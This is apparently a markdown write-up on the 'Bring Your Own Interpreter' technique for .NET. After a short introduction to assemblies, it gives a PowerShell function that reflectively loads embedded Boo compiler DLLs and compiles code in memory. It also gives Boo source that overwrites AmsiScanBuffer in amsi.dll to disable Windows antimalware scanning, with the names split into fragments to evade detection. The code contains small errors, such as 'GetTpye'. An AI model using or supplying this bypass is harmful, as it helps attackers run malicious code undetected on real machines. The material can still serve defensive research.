### 1 - Introduction 

**What is .NET Assemblies :**

Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications. An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications. 
They provide the common language runtime with the information it needs to be aware of type implementations.



- .NET assemblies can be executed by any .NET langage
- The function `Assembly.Load()` will reflectively load .NET Assemblies

>⚠️  **.NET Format Assemblies ≠ C Format Assemblies**

### 2 - BYOI Concept

this technique which was discovered [byt3bl33d3r](https://github.com/byt3bl33d3r) consists in using third party parts of the languages present in .NET for embedding a interpreter into a default .NET langage


```powershell
function Invoke-BoolangAmsiPatch {
    $BooLangDLL = @'<BOOLANG_DLL>'@
    $BooLangCompilerDLL = @'<BOOLANG_COMPILER_DLL>'@
    $BooLangParserDLL = @'<BOOLANG_PARSER_DLL>'@
    $BoolangExtensionsDLL = @'<BOOLANG_EXTENSION_DLL>'@

    function Load-Assembly($EncodedCompressedFile){
        $DeflatedStream = [IO.Compression.DeflateStream]::new([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile), [IO.Compression.CompressionMode]::Decompress)
        $UncompressedFileBytes = New-Object Byte[] (1900000)
        $DeflatedStream.Read($UncompressedFileBytes, 0, 1900000) | Out-Null
        return [Reflection.Assembly]::Load($UncompressedFileBytes)
    }
    $BooLangAsm = Load-Assembly($BooLangDLL)
    $BooLangCompilerAsm = Load-Assembly($BooLangCompilerDLL)
    $BooLangParserAsm = Load-Assembly($BooLangParserDLL)
    $BooSource = @' {Code Here} '@
    
    $scriptinput = [Boo.Lang.Compiler.IO.StringInput]::new("MyScript.boo", $booSource)
    $parameters = [Boo.Lang.Compiler.CompilerParameters]::new($false)
    $parameters.Input.Add($scriptinput) | Out-Null
    $parameters.Pipeline = [Boo.Lang.Compiler.Pipelines.CompileToMemory]::new()
    $parameters.Ducky = $true
    $parameters.AddAssembly($BooLangAsm)
    $parameters.AddAssembly($BoolangExtensionsAsm)
    $parameters.AddAssembly($BooLangCompilerAsm)
    $parameters.AddAssembly($BooLangParserAsm)
    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("mscorlib"))
    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System"))
    $parameters.AddAssembly([Reflection.Assembly]::LoadWithPartialName("System.Core"))
    $compiler = [Boo.Lang.Compiler.BooCompiler]::new($parameters)
    Write-Output = "[*] Compiling"
    $context = $compiler.Run()

    if ($context.GeneratedAssembly -ne $null){
        Write-Output "[*] Execution"
        $scriptModule = $context.GeneratedAssembly.GetTpye("MyScriptModule")
        $mainfunction = $scriptModule.GetMethod("Main")
        $mainfunction.Invoke($null, $null)
    }
    else {
        Write-Output $context.Errors.ToString($true)
    }
}
}
```
the $BooSource Variable will contain the boolang code

```boo
import System
import System.Runtime.InteropServices

[DllImport("kernel32.dll", SetLastError: true, CharSet: CharSet.Unicode)]
public static def LoadLibrary(lpFileName as string) as IntPtr:
	pass
	
[DllImport("kernel32.dll", CharSet: CharSet.Ansi, ExactSpelling: true, SetLastError: true)]
public static def GetProcAddress(hModule as IntPtr, procName as string) as IntPtr:
	pass
	
[DllImport("kernel32.dll")]
public static def VirtualProtect(lpAddress as IntPtr, dwSize as int, flNewProtect as uint, ref lpfOldProtect as IntPtr) as bool:
	pass

public static def PatchMem(dll as string, function as string, patch as (byte)):
	try:
		oldProtect as IntPtr = 0
		library = LoadLibrary(dll)
		print ""
		print "[>] $(dll) address : $(library)"
		address = GetProcAddress(library, function)
		result = VirtualProtect(address, patch.Length, 0x40, oldProtect)
		Marshal.Copy(patch, 0, address, patch.Length)
		result = VirtualProtect(address, patch.Length, 0x20, oldProtect)
	except:
		print "[!] Error when Patching $(dll) : $(function)"
public static def Main():
	amsi_patch as (byte)
	if IntPtr.Size == 8:
		print "[*] x64"
		amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
	else:
		print "[*] x86"
		amsi_patch = array(byte, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00])
	PatchMem("am"+"si.dll", "Am"+"si"+"Sc"+"AnBu"+"ffer", amsi_patch)
```

![image](https://user-images.githubusercontent.com/75935486/154958196-8b4281b8-87d4-4a91-8e11-4d2092358a94.png)
